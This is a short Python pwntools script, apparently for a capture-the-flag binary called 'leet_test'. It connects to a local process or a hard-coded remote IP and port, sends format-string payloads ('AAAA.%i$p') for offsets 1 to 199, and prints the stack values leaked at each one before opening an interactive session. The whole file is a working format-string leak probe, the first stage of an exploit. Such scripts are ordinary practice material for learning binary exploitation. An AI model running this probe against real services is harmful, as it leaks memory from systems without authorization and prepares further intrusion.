from pwn import *

# b *main+233
gs = '''
continue
'''

elf = context.binary = ELF("./leet_test")

def start():
    if args.REMOTE:
        return remote("83.136.254.158", 48817)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

for i in range(1, 200):
    io.sendlineafter("Please enter your name: ", f"AAAA.%{i}$p".encode())
    io.recvuntil(b"Hello, ")
    print(f"[+] {i} : ", io.recvline().decode().strip())

io.interactive()

